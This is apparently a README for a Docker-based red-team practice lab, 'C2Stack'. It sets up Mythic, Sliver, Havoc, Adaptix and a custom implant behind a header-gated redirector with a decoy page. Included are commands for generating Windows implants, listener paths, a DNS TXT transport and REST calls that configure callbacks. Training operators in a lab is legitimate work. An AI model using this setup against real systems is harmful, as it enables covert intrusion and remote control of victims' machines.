# C2Stack Docker Practice Guide

## Overview

C2Stack is deployed as Docker containers: a header-aware **redirector** in front of the
**Mythic**, **Sliver**, and **Havoc** C2 frameworks, with your existing **Kali VM** as
the operator workstation. This collapses the old two-VM / two-network design into
containers while keeping the core workflow intact.

The operator workflow and C2 workflow are unchanged — only the infrastructure changed
from VMs to containers.

## What Must Stay True

The practice build should still preserve these behaviors:

- Victim-facing entry point remains separate from the real C2 backend.
- Redirector logic still requires a valid header before proxying to the backend.
- Mythic, Sliver, Havoc, Adaptix, and Meridian remain usable as distinct frameworks.
- Loki-style "living off the cloud" C2 is *not implemented in this repo*; all C2Stack
  agents egress through the redirector (HTTP) or the Meridian DNS listener.
- Operator state should persist across restarts.

## What Can Be Containerized

These components are reasonable Docker candidates:

- Redirector Apache proxy.
- Meridian C2 daemon (HTTP + DNS TXT listeners).
- Mythic teamserver and its supporting services.
- Sliver server.
- Havoc teamserver.
- Adaptix teamserver.
- Supporting web UI and service glue.

These can also be mounted into volumes so they survive restart without rebuilding the image.

## What Is Harder To Replace

The following parts are where Docker-only becomes less faithful to the current setup:

- The VM trust boundary between victim-facing redirector and C2 backend.
- The Kali operator workstation as a dense tool host.
- The clean separation that comes from hypervisor-level isolation.

If the goal is realistic operator practice, the missing isolation matters more than the service count.

## Recommended Docker-First Practice Layout

Use a single Docker host and split the lab into three logical layers:

1. `redirector` container on the victim-facing network.
2. `meridian`, `sliver`, `havoc`, `adaptix`, and `mythic` containers on the back-end network.
3. One operator workstation, either as the host itself or as a lightweight Kali VM, for tools and hands-on interaction.

This keeps the deployment quick without forcing every tool into a separate container.

### Suggested shape

```text
Host
├─ docker compose
│  ├─ redirector
│  ├─ meridian
│  ├─ sliver
│  ├─ havoc
│  ├─ adaptix (optional profile)
│  └─ mythic (optional profile)
└─ optional operator VM or host shell
   └─ nmap, hashcat, certipy, netexec, smb tools, browser access
```

## Why Not Pure Docker Everywhere

Pure Docker is possible, but it comes with tradeoffs:

- Weaker isolation than VMs.
- More manual volume and permission handling.
- Less natural separation between lab services and operator tooling.
- Harder to model a realistic compromised-redirector scenario.

For quick practice, that is acceptable.
For stronger realism, it is a downgrade.

## Best Option By Constraint

### Fastest setup

Docker-only services plus host-based tooling.

Use this when the goal is to practice workflow, callbacks, and operator muscle memory with minimal setup time.

### Best balance

Docker services plus one lightweight operator VM.

Use this when you want most of the speed of Docker but still want a familiar Kali-like working environment.

### Strongest isolation

Keep the current two-VM design.

Use this when you care most about realistic containment and the redirector/C2 trust boundary.

## Recommendation

For a standalone practice build, I would choose the **Docker-first + single operator workstation** approach.

That gives the best speed-to-learning ratio without forcing the whole stack into a fragile all-container layout. It is the cleanest compromise if the goal is efficient repetition rather than production-grade isolation.

## Implementation (Docker-first)

The stack is implemented under `C2Stack/Docker/`. The Kali VM is the operator
workstation; the redirector and the five C2 frameworks run as containers.

### Layout

```
C2Stack/Docker/
├── docker-compose.yml        # redirector + meridian + sliver + havoc (+ mythic/adaptix profiles)
├── .env.example              # copy to .env and adjust
├── docker-bootstrap.ps1      # Windows host bootstrap (Docker Desktop)
├── docker-bootstrap.sh       # Linux/macOS host bootstrap
├── redirector/
│   ├── Dockerfile
│   ├── apache/
│   │   ├── c2stack.conf.template   # header-based routing, env-driven
│   │   └── decoy.html              # CloudEdge CDN decoy page
│   └── entrypoint.sh
├── meridian/                 # zero-dep Go implant + async Python C2 daemon
│   ├── Dockerfile            # multi-stage build (golang builder + python server)
│   ├── entrypoint.sh         # starts HTTP (:8080) & DNS (:5353) listeners
│   ├── meridian/             # python server package
│   └── implant/              # parallax Go implant source (stdlib only)
├── sliver/                   # vendored v1.7.7 release binaries (SHA256-pinned) + Dockerfile
│   ├── bootstrap.sh          # daemon + operator config + HTTP listener (auto at start)
│   └── bootrc.rc             # rc script: http listener :80 rootpath /cloud/storage/objects
├── havoc/                    # vendored Havoc source (GPL-3.0) + Dockerfile (toolchains baked)
│   └── havoc.yaotl           # C2Stack teamserver profile: HTTP listener :80 (redirector)
├── adaptix/                  # vendored Adaptix source (GPL-3.0) + Dockerfile (built in-repo)
├── mythic/                   # (optional) config + apollo sibling container wiring
│   └── apollo/rabbitmq_config.json   # payload-type container self-registration config
└── portal/                   # Flight Control dashboard (:8000) + tests
```

### Networks

- `c2_edge` — the redirector publishes its victim-facing port here.
- `c2_core` — `internal: true` back-channel. The C2 frameworks have **no** direct
  internet egress and are only reachable through the redirector. The operator
  reaches their UIs/control ports via the host-published ports.

### Run it

```powershell
# Windows (Docker Desktop)
cd C2Stack\Docker
.\docker-bootstrap.ps1               # redirector + sliver + havoc (default)
.\docker-bootstrap.ps1 -Mythic       # also bring up Mythic
.\docker-bootstrap.ps1 -Adaptix      # also bring up Adaptix (builds from source)
.\docker-bootstrap.ps1 -All          # all four frameworks
```

```bash
# Linux/macOS
cd C2Stack/Docker
./docker-bootstrap.sh                # redirector + sliver + havoc (default)
./docker-bootstrap.sh --mythic       # also bring up Mythic
./docker-bootstrap.sh --adaptix      # also bring up Adaptix (builds from source)
./docker-bootstrap.sh --all          # all four frameworks
```

### Verified state (Sep 2026)

- **Redirector** — vhost-level header+prefix routing to all 5 backends (no longer
  `<Location>`-based); matrix tested: correct `X-Request-ID` proxies, missing/wrong
  header falls through to the decoy page (404). Distinguishable live probes:
  with-header requests return empty-404 from the backend listener; no-header
  probes return the Apache-styled decoy page.
- **Meridian** — full E2E proven through the redirector: KEX → beacon → task → result
  (`whoami` round-trip on a Windows host implant), and the DNS transport proven
  (chunked TXT over UDP 5353 in-container via host port 15353). All Go unit tests pass.
- **Sliver** — v1.7.7 (SHA256-pinned), bootstrap at container start mints the
  `cadre` operator config and creates the HTTP listener (bind :80,
  RootPath `/cloud/storage/objects`) — verified live: with-header requests hit the
  listener, decoy without header. Full garble `generate` proven on v1.7.7 (47s build);
  headless generation works: `sliver-client console --rc gen.rc` where the rc file
  contains `generate --http 192.168.77.1:80 --os windows --arch amd64 --name X` + `exit`.
- **Havoc** — v0.7 teamserver with the C2Stack HTTP listener baked into the profile
  (`Docker/havoc/havoc.yaotl`): bind :80, Uris `/edge/cache/assets/`,
  header `X-Request-ID: cadre-c2`, Hosts `192.168.77.1` (the redirector). Live-verified
  through the redirector. Demon payloads are compiled SERVER-SIDE by the teamserver —
  the image now ships `payloads/Demon` (sources) + `payloads/DllLdr.x64.bin` +
  `Shellcode.x64/x86.bin` and the musl cross-gcc/nasm toolchains (this was a real gap:
  the Dockerfile never copied payloads, so every Demon build would have failed
  client-side build request; smoke-compile through the baked include tree now passes).
- **Adaptix** — teamserver :4321 published and reachable from the host; the service
  is on `c2_edge` because Docker drops port publishing for containers that sit only
  on the internal `c2_core` network (see the compose comment). All listener/agent
  extenders ship in-image (`/app/extenders`: HTTP/SMB/TCP/DNS + beacon/gopher agents);
  operator connects with the Qt packet client on Kali (teamserver password `pass`,
  operator1 `pass1` — set in `/app/profile.yaml`), creates the HTTP Beacon listener
  on :80 with URI `/api/v1/sync` (redirector prefix) and builds beacons — beacon
  compilation happens CLIENT-side in the packet GUI (the Go/mingw/gcc/make/git
  toolchains in the image are the documented teamserver runtime deps).
- **Mythic** — server+postgres+rabbitmq healthy (latest stable 3.4.0.61). The Apollo
  payload type is registered **without mythic-cli**: it self-registers over RabbitMQ
  sync queues as a sibling container (`mythic_apollo`, owns
  `Docker/mythic/apollo/rabbitmq_config.json`). The HTTP C2 profile is resolved too —
  as a mixed Go/Python ecosystem: the `http` profile container
  (`ghcr.io/mythicc2profiles/http:v0.0.3.2`, `mythic_http` service) self-registers the
  same way and serves the agent-facing :80 listener. REST `/auth` + webhooks verified
  on :7443, full payload build proven (Apollo .exe with the http profile, callback
  through the redirector).

### Operator (Kali VM) next steps

- Callback endpoint: `http://<host-ip-on-vmnet2>:<REDIRECTOR_HTTP_PORT>` with header
  `X-Request-ID: cadre-c2`.
- Mythic REST: `http://<host-ip-on-vmnet2>:7443` (JWT via `POST /auth`, webhooks under
  `/api/v1.4`) — enable `--profile mythic`.
- Sliver operator: connect `sliver-client` to `<host-ip>:31337` with the operator config
  minted at container start (name `cadre`: `docker exec c2stack-sliver-1 sh -c "sliver-server
  operator --name cadre --lhost 127.0.0.1 -p 31337 -s /tmp/cadre.op.cfg -P all"` then
  import+console on the Kali box).
- Havoc teamserver: `<host-ip>:40056`.
- Adaptix operator: Qt GUI client → `<host-ip>:4321` (enable `--profile adaptix`).

### Framework listener tuning

The redirector forwards each URI prefix to the matching backend **preserving the full
path**, exactly like the VM setup. Two listeners are configured by the stack itself;
the rest are created from the operator consoles:

- **Sliver** — automatic: `Docker/sliver/bootstrap.sh` runs the HTTP listener with
  `RootPath` = `/cloud/storage/objects` on port `80` at container start (idempotent).
  Payloads are generated with `generate --http <redirector-host>:80` so they call back
  through the redirector.
- **Havoc** — automatic: `Docker/havoc/havoc.yaotl` (baked into the image at build)
  starts an HTTP listener on port `80` with `Hosts = ["192.168.77.1"]` (the C2Stack
  redirector, so generated Demons phone home correctly out of the box). If the lab
  redirector host differs, edit Hosts in the Qt client (Listeners → c2stack - http)
  or in the profile + rebuild. Base path `/edge/cache/assets` + header come from the
  same file.
- **Mythic** — the `http` C2 profile container is registered and the listener is live
  inside `mythic_http` (:80). Create the profile instance via the REST API:
  `POST /api/v1.4/create_c2parameter_instance_webhook` with a JSON-string `c2_instance`
  (fields `callback_host` — **without** a port, `callback_port`, `headers`
  `X-Request-ID: cadre-c2`, `get_uri`/`post_uri`/`query_path_name` low-noise paths).
  Then start it: `POST /start_stop_profile_webhook` `{"id":1,"action":"start"}`, and
  set `callback_host` in the payload to the redirector URL
  `http://<host-ip-on-vmnet2>/cdn/media/stream`. See `Docker/mythic/README.md` for the
  full worked example (payload build + download verified).
- **Adaptix** — the HTTP Beacon listener binds port `80` inside the container; create
  it in the Qt GUI client with URI `/api/v1/sync` to match the redirector prefix.
  The DNS, SMB, and TCP listeners operate out-of-band (not through the redirector).
- **Meridian** — the HTTP listener binds port `8080` on `c2_core`; it accepts both the
  plain API paths and the redirector's `/gateway/v1/telemetry` prefixed path. The DNS
  listener listens on `0.0.0.0:5353/udp` inside the container (domain `c2.cadre.local`);
  the host-facing UDP port is `MERIDIAN_DNS_PORT` (default `15353` — Windows mDNS
  occupies 5353). Implants configured for the redirector must set
  `MERIDIAN_HTTP=<redirector>:80`, `MERIDIAN_URI_PREFIX=/gateway/v1/telemetry`, and the
  `X-Request-ID: cadre-c2` header (defaults in `implant/main.go`).

### Runtime dependency & implant-generation verification

Run these after any Dockerfile/dependency change so pruned packages can't
silently break payload generation (as happened when `git` was dropped from
the sliver image and every `generate` failed; fixed in 93ac840):

```powershell
# Sliver — garble needs git (git apply for linker patches) + Go toolchain
docker exec c2stack-sliver-1 sh -c "which git; which go"
# verify an actual build: sliver-client -> generate (garble) succeeds

# Havoc — generation compiles Demon SERVER-SIDE with the baked cross-gcc + nasm;
# the source/include tree MUST be present (was missing and silently broke builds)
docker exec c2stack-havoc-1 sh -c "ls /opt/havoc/teamserver/payloads/Demon/src /opt/havoc/teamserver/payloads/*.bin"
docker exec c2stack-havoc-1 sh -c 'cd /opt/havoc/teamserver && PATH="data/x86_64-w64-mingw32-cross/bin:$PATH" x86_64-w64-mingw32-gcc -Ipayloads/Demon/include -Os -o /tmp/t.exe /tmp/t.c'
docker exec c2stack-havoc-1 sh -c 'printf "BITS 64\nsection .text\nglobal f\nf: ret\n" > /tmp/t.asm && nasm -f win64 /tmp/t.asm -o /tmp/t.o && ls /tmp/t.o'

# Adaptix — teamserver runtime needs go + mingw + gcc + make + git
docker exec c2stack-adaptix-1 sh -c "which go gcc make git x86_64-w64-mingw32-gcc"
# ...and the extenders (listeners/agents) must be present in-image
docker exec c2stack-adaptix-1 sh -c "ls /app/extenders"

# Meridian — payloads are pre-built in the image (no runtime compiler needed)
docker exec c2stack-meridian-1 ls /opt/meridian/payloads
```

### Further Reading & Field Practice

- See the **[Field Practice & Study Guide](PRACTICE-GUIDE.md)** for detailed lab exercises, DNS covert tunneling walk-through, and DFIR-Nexus threat hunting queries.

### Known tradeoffs vs the VM design

- Container isolation is weaker than the hypervisor trust boundary between redirector
  and C2 backend. `c2_core` being `internal` recovers most of the egress isolation.
- Mythic and Adaptix are profile-gated to keep the default stack lightweight. Mythic
  pulls upstream images; Adaptix builds from source (first build ~5-10 min).
- Havoc is built from source at image-build time (needs network); Sliver pulls a
  prebuilt binary. Both persist data via named volumes.